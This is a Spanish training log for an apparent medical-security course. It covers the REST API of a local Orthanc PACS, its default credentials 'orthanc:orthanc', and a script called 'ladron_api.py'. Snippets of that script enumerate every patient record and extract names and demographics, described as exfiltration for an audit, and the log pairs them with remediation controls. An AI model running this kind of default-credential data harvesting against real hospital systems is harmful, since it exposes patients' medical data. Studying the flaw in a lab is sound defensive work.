# 🔐 Bitácora de Entrenamiento: Seguridad Web & APIs (Módulo 6)

## Objetivo
Comprender la superficie de ataque moderna de un PACS (API REST), automatizar la exfiltración de bases de datos médicas y aplicar técnicas de auditoría de seguridad.

**Herramientas:** Python (`requests`), JSON, Orthanc API REST, HTTP Basic Authentication

---

## 📝 Archivos Modificados en este Módulo

| Archivo | Tipo | Cambios Realizados |
|---------|------|-------------------|
| `ambulancia.py` | **Mejorado** | Soporte para múltiples archivos DICOM, funciones auxiliares, parsing de argumentos CLI |
| `ladron_api.py` | **NUEVO** | Script de auditoría/exfiltración de datos via API REST |
| `Bitacora(Modul6).md` | **NUEVO** | Documentación completa del módulo (este archivo) |

---

## 1. 🎯 La Superficie de Ataque: El PACS Moderno

### Dos Caras del Mismo Servidor

Los servidores médicos modernos (como Orthanc) exponen **dos interfaces completamente diferentes**:

| Interface | Puerto | Protocolo | Complejidad | Acceso |
|-----------|--------|-----------|-------------|--------|
| **DICOM (Máquinas)** | 4242 | DICOM (binario) | ⭐⭐⭐⭐ Alto | Solo equipos médicos autenticados |
| **HTTP/REST (Humanos)** | 8042 | HTTP JSON | ⭐⭐ Bajo | Cualquier navegador, script, herramienta |

### El Ataque por Capa 7 (Aplicación)

```
Máquina Atacante
     ↓
[Navegador] → http://127.0.0.1:8042
     ↓
API REST sin cifrado (HTTP en localhost)
     ↓
Credenciales por defecto: orthanc:orthanc
     ↓
BASE DE DATOS MÉDICA COMPLETA EXPUESTA
```

### La Vulnerabilidad Crítica: Credenciales por Defecto

```bash
# Comando de inicio de Orthanc
sudo docker run -p 8042:8042 jodogne/orthanc-plugins

# Resultado:
# - Usuario: orthanc
# - Contraseña: orthanc
# ← VULNERABILIDAD: La mayoría de hospitales NO cambia esto
```

**Impacto:**
- ✅ El atacante NO necesita quebrar encriptación
- ✅ NO necesita herramientas especializadas (curl/python bastan)
- ✅ Acceso a TODOS los datos médicos en segundos

---

## 2. 🌐 API REST: El Nuevo Punto Débil

### ¿Qué es una API REST?

**REST** = *Representational State Transfer*

Es un estilo de comunicación cliente-servidor usando **HTTP simple**:

| Método HTTP | Operación | Ejemplo | Función |
|-------------|-----------|---------|---------|
| **GET** | Leer datos | `GET /patients` | Obtener lista de pacientes |
| **POST** | Crear datos | `POST /patients` | Crear nuevo paciente |
| **PUT** | Actualizar datos | `PUT /patients/123` | Modificar datos |
| **DELETE** | Borrar datos | `DELETE /patients/123` | Eliminar paciente |

### Ventajas y Desventajas de API REST

| Aspecto | Ventaja | Riesgo |
|--------|---------|--------|
| **Simpleza** | Fácil de usar (cualquier navegador) | Fácil de atacar |
| **Accesibilidad** | Disponible desde cualquier máquina | Sin control de acceso robusto |
| **Velocidad** | Rápido para operaciones normales | Rápido para robar datos (bulk download) |
| **Estándar HTTP** | Compatible con todo | Requiere autenticación básica (vulnerable) |

### Flujo de una Solicitud REST

```
[Cliente]
   ↓ GET /patients + Authorization: Basic b3J0aGFuYzpvcnRoYW5j
[HTTP]
   ↓ Puerto 8042
[Servidor Orthanc]
   ↓ Verifica credenciales
   ↓ Busca en base de datos
   ↓ Retorna JSON
[Respuesta JSON]
   ↓ 200 OK + [{"ID": "1", "Name": "Juan"}]
[Cliente parsea JSON]
```

---

## 3. 🔓 Autenticación Básica: El Eslabón Débil

### HTTP Basic Authentication

```
Encabezado HTTP:
Authorization: Basic b3J0aGFuYzpvcnRoYW5j

Decodificado (Base64):
orthanc:orthanc
└─ usuario:contraseña
```

### Vulnerabilidades

| Vulnerabilidad | Descripción | Impacto |
|---|---|---|
| **Sin Encriptación** | Base64 es reversible (`echo "b3J0aGFuYzpvcnRoYW5j" \| base64 -d`) | Credenciales expuestas en logs |
| **Credenciales Débiles** | Por defecto: orthanc/orthanc | Acceso sin autorización |
| **Sin Rate Limiting** | Puedes hacer miles de requests/segundo | Fuerza bruta viable |
| **Sin Auditoría** | No hay logs de acceso | Robo indetectable |

### Comparativa: Autenticación Segura vs Insegura

| Método | Seguridad | Complejidad | Uso |
|--------|-----------|-------------|-----|
| HTTP Basic | ⭐ (Muy baja) | ⭐ (Mínima) | Testing/localhost |
| HTTPS + Basic | ⭐⭐⭐ (Media) | ⭐⭐ (Media) | Producción básica |
| OAuth 2.0 | ⭐⭐⭐⭐⭐ (Alta) | ⭐⭐⭐ (Alta) | Aplicaciones modernas |
| JWT + HTTPS | ⭐⭐⭐⭐ (Alta) | ⭐⭐⭐ (Alta) | APIs profesionales |

---

## 4. 🏥 Script: El Ladrón de API (`ladron_api.py`)

**Misión:** Automatizar la auditoría de seguridad (exfiltración de datos para demostrar la vulnerabilidad).

### 🧠 Arquitectura del Ataque

#### Fase 1: Reconocimiento

```python
respuesta = requests.get(
    "http://localhost:8042/patients",
    auth=("orthanc", "orthanc")  # Credenciales por defecto
)
```

**¿Qué ocurre?**
1. Se envía petición HTTP GET
2. El servidor Orthanc recibe
3. Verifica credenciales (Basic Auth)
4. Retorna JSON con lista de IDs de pacientes

**Respuesta típica:**
```json
[
  "d5ee0e0d-2f4d2219-7d2c7c39-1bb2a3a1",
  "a1b2c3d4-e5f6g7h8-i9j0k1l2-m3n4o5p6",
  "xyz1234567890abcdef"
]
```

#### Fase 2: Extracción Masiva (Web Crawling)

```python
for id_paciente in lista_ids:
    url = f"http://localhost:8042/patients/{id_paciente}"
    datos = requests.get(url, auth=("orthanc", "orthanc")).json()
    
    # Parsear JSON → Extraer nombre real, sexo, ID
    nombre = datos["MainDicomTags"]["PatientName"]
    sexo = datos["MainDicomTags"]["PatientSex"]
```

**¿Cuántos datos se roban?**
- **1 paciente:** 1 request
- **100 pacientes:** 100 requests (< 1 segundo)
- **10,000 pacientes:** 10,000 requests (< 10 segundos con threading)

#### Fase 3: Parsing del JSON

```
JSON CRUDO (Lo que retorna Orthanc):
{
  "ID": "d5ee0e0d-...",
  "IsStable": true,
  "LastUpdate": "20260128T121530",
  "MainDicomTags": {
    "PatientName": "LEDESMA^EMANUEL",
    "PatientID": "123456",
    "PatientBirthDate": "19991108",
    "PatientSex": "M"
  },
  "PatientMainDicomTags": {...},
  "Studies": [...]
}

↓ Navegación del JSON:

datos = json_response
tags = datos.get("MainDicomTags", {})  # Obtener diccionario de tags
nombre = tags.get("PatientName", "DESCONOCIDO")  # Extraer nombre
sexo = tags.get("PatientSex", "?")  # Extraer sexo

RESULTADO:
nombre = "LEDESMA^EMANUEL"
sexo = "M"
```

### 📊 Tabla de Endpoints Vulnerables

| Endpoint | Método | Información Expuesta | Ejemplo |
|----------|--------|---------------------|---------|
| `/patients` | GET | Lista de IDs de TODOS los pacientes | `[id1, id2, id3, ...]` |
| `/patients/{id}` | GET | Datos demográficos completos | `{"Name": "...", "Sex": "M", ...}` |
| `/patients/{id}/studies` | GET | Todos los estudios del paciente | `[study1, study2, ...]` |
| `/studies/{id}/series` | GET | Series DICOM (modalidades) | CT, MR, XC, etc. |
| `/instances/{id}` | GET | Metadatos completos de la imagen | Dosis, protocolo, parámetros técnicos |
| `/system` | GET | Información del servidor | Versión, configuración, espacio disco |

---

## 5. 🔧 Mejoras a `ambulancia.py` (Módulo 6)

En este módulo, el script `ambulancia.py` fue **significativamente mejorado** para soportar producción:

### ✨ Nuevas Características

#### 1. **Soporte para Múltiples Archivos DICOM**

**Antes:**
```python
# Solo podía procesar UN archivo
ARCHIVO_A_ENVIAR = 'paciente_anonimo.dcm'
ds = pydicom.dcmread(ARCHIVO_A_ENVIAR)
assoc.send_c_store(ds)
```

**Ahora:**
```bash
# Opción 1: Un archivo específico
python ambulancia.py paciente_anonimo.dcm

# Opción 2: Toda una carpeta (busca recursivamente)
python ambulancia.py Anonymized_20260129/

# Opción 3: Sin argumentos (usa valor por defecto)
python ambulancia.py
```

#### 2. **Funciones Auxiliares Reutilizables**

```python
def obtener_archivos_dcm(ruta):
    """
    - Detecta si es archivo o carpeta
    - Busca recursivamente *.dcm
    - Retorna lista ordenada de rutas
    """

def procesar_archivo_dicom(archivo, ae, ...):
    """
    - Procesa UN archivo DICOM
    - Manejo de errores robusto
    - Retorna True/False para estadísticas
    """
```

#### 3. **Parsing de Argumentos CLI**

```python
import sys

if len(sys.argv) > 1:
    ARCHIVO_A_ENVIAR = sys.argv[1]  # Usuario puede pasar ruta
else:
    ARCHIVO_A_ENVIAR = 'Anonymized_20260129'  # Valor por defecto
```

#### 4. **Resumen Estadístico Final**

```
[i] Archivos DICOM encontrados: 42
[→] Procesando: archivo1.dcm
    [✓] Enviado exitosamente
[→] Procesando: archivo2.dcm
    [✓] Enviado exitosamente
...
--- RESUMEN DE TRANSMISIÓN ---
Total procesados: 42
[✓] Exitosos:    42
[✗] Fallidos:    0

[✓✓✓] ¡TODAS LAS IMÁGENES FUERON ENVIADAS EXITOSAMENTE! ✓✓✓
```

#### 5. **Manejo Robusto de Errores**

```python
try:
    ds = pydicom.dcmread(archivo_dicom)
except Exception as e:
    print(f"[✗] Error al cargar {archivo_dicom}")
    print(f"    → {str(e)}")
    return False  # Continúa con el siguiente archivo
```

### Comparativa: Antes vs Después

| Función | Antes | Después |
|---------|-------|---------|
| **Archivos soportados** | 1 archivo `.dcm` | N archivos + carpetas recursivas |
| **Parámetros** | Hardcodeados | Argumentos CLI |
| **Manejo de errores** | Mínimo | Robusto con try-except |
| **Estadísticas** | No | Resumen final |
| **Escalabilidad** | Baja | Alta (100+ archivos) |
| **Reutilización** | Baja | Alta (funciones) |

---

## 6. 🛡️ Ciberseguridad en IoMT: Principios Clave

### El Triángulo de Riesgo Médico

```
        CONFIDENCIALIDAD
        (Datos privados)
             △
            / \
           /   \
          /     \
         /       \
        /         \
       ┌───────────┐
      /             \
   INTEGRIDAD    DISPONIBILIDAD
  (No adulteración) (Funcionamiento 24/7)

En IoMT, los TRES lados son críticos:
- Confidencialidad: Paciente no quiere que otros vean su diagnóstico
- Integridad: Falso resultado médico = muerte del paciente
- Disponibilidad: PACS caído = cirugía cancelada
```

### Matriz de Riesgos IoMT

| Escenario | Tipo de Ataque | Impacto | Severidad |
|-----------|---|---|---|
| **Robo de datos** | Exfiltración API | GDPR, reputación, multas | 🔴 CRÍTICA |
| **Sabotaje de imágenes** | Modificar DICOM en tránsito | Diagnóstico falso, muerte | 🔴 CRÍTICA |
| **Denegación de servicio** | DDoS al PACS | Cirugías canceladas | 🔴 CRÍTICA |
| **Acceso no autorizado** | Credenciales débiles | Cambio de datos, fuga | 🔴 CRÍTICA |
| **Logs falsos** | Borrar/modificar auditoría | Imposible investigación forense | 🟠 ALTA |

---

## 7. 🔒 Lecciones de Seguridad: Lo que Aprendiste

### Vulnerabilidades Descubiertas

| # | Vulnerabilidad | Causa | Solución |
|---|---|---|---|
| 1 | **Credenciales por defecto** | Configuración inicial de Orthanc | Cambiar usuario/contraseña inmediatamente |
| 2 | **HTTP sin cifrado** | Localhost (desarrollo) | Usar HTTPS en producción |
| 3 | **Basic Auth débil** | Base64 reversible | Usar OAuth 2.0 o JWT |
| 4 | **Sin rate limiting** | Orthanc default | Implementar API Gateway (Kong, AWS API GW) |
| 5 | **Sin auditoría** | Logs desactivados | Habilitar logging con timestamps y usuario |
| 6 | **Acceso irrestricto** | API pública | Implementar ACL (Access Control Lists) |

### Controles de Seguridad IoMT

```
CAPA 1: AUTENTICACIÓN
  ✓ Cambiar credenciales por defecto
  ✓ Implementar OAuth 2.0 / SAML
  ✓ Autenticación multifactor (MFA)

CAPA 2: AUTORIZACIÓN
  ✓ Role-Based Access Control (RBAC)
  ✓ Médicos solo ven sus pacientes
  ✓ Administrativos no ven datos clínicos

CAPA 3: CIFRADO
  ✓ HTTPS para HTTP/REST
  ✓ TLS para DICOM (DICOM Secure)
  ✓ Cifrado en reposo (bases de datos)

CAPA 4: AUDITORÍA
  ✓ Log de TODOS los accesos
  ✓ Quién, qué, cuándo, dónde
  ✓ Alertas para accesos anómalos

CAPA 5: DEFENSA
  ✓ Firewall (solo máquinas médicas)
  ✓ IDS/IPS (como tu scanner vigilante.py)
  ✓ Rate limiting
  ✓ CORS (Cross-Origin Resource Sharing)
```

---

## 8. 📚 Ciclo Completo: De Captura a Exfiltración

```
MÓDULO 1-2: INFRAESTRUCTURA
  ├─ radar.py:      Descubre dispositivos en la red
  └─ vigilante.py:  Detecta intrusos (IDS)

MÓDULO 3: PROCESAMIENTO
  ├─ medico.py:     Anonimiza imágenes DICOM
  └─ auditor.py:    Verifica privacidad

MÓDULO 4: TRANSMISIÓN
  └─ ambulancia.py: Envía imágenes al PACS (DICOM C-STORE)

MÓDULO 5: MENSAJERÍA
  └─ recepcionista.py: Admite pacientes (HL7 ADT^A01)

MÓDULO 6: AUDITORÍA DE SEGURIDAD
  ├─ ambulancia.py:  (mejorado) Envío masivo
  └─ ladron_api.py:  Audita API REST, exfiltra datos
```

---

## 9. 🎯 Ejercicio de Auditoría: Paso a Paso

### Ejecutar una Auditoría Segura

```bash
# 1. Asegurar que Docker está corriendo
sudo docker ps | grep mi-pacs

# 2. Enviar imágenes de prueba (ambulancia.py)
python ambulancia.py Anonymized_20260129/

# 3. Ejecutar auditoría de API (ladron_api.py)
python ladron_api.py

# 4. Verificar en navegador lo que el script extrajo
curl http://localhost:8042/patients -u orthanc:orthanc | python -m json.tool
```

### Interpretación de Resultados

| Salida | Significado | Acción |
|--------|-------------|--------|
| ✓ 200 OK + JSON | API responde correctamente | Continuar auditoría |
| ✗ 401 Unauthorized | Credenciales incorrectas | Verificar usuario/contraseña |
| ✗ 403 Forbidden | Autenticado pero sin permisos | Verificar roles/ACL |
| ✗ Connection refused | Servidor no responde | Verificar Docker, firewall, puerto |

---

## 10. 🏥 Contexto Real: Hospital Alemán

### Escenario: St. Mariahilf Hospital (Berlín)

| Componente | Configuración Actual (Vulnerable) | Recomendación Segura |
|---|---|---|
| **PACS (Orthanc)** | HTTP + credenciales default | HTTPS + SAML + RBAC |
| **Autenticación** | orthanc:orthanc | AD/LDAP integrado |
| **Red** | Abierta a todo localhost | VPN + Firewall |
| **Auditoría** | Deshabilitada | ELK Stack + Syslog |
| **Encriptación** | Ninguna | AES-256 en reposo |

### Cumplimiento Normativo (GDPR / MDR)

- ✅ **GDPR Art. 32:** Implementar medidas técnicas de seguridad
- ✅ **MDR (Medical Device Regulation):** Seguridad y privacidad de datos
- ✅ **ISO 27001:** Gestión de seguridad de información
- ✅ **IEC 80001:** Redes de dispositivos médicos

---

## 11. 📋 Resumen de Conceptos

| Concepto | Definición | Ejemplo |
|----------|-----------|---------|
| **REST API** | Interfaz web para comunicación cliente-servidor | GET /patients → lista de pacientes |
| **Basic Auth** | Autenticación por usuario:contraseña en Base64 | `Authorization: Basic b3J0...` |
| **JSON** | Formato de datos legible y parseble | `{"name": "Emanuel", "sex": "M"}` |
| **Endpoint** | URL específica en una API | `/patients`, `/patients/{id}` |
| **Web Crawling** | Iterar sobre múltiples URLs automáticamente | Loop de 10,000 pacientes |
| **Exfiltración** | Robo de datos del sistema | Script que descarga BD completa |

---

*Última actualización: Enero 2026*  
*Módulo 6: Seguridad Web & APIs - Auditoría de Sistemas Médicos*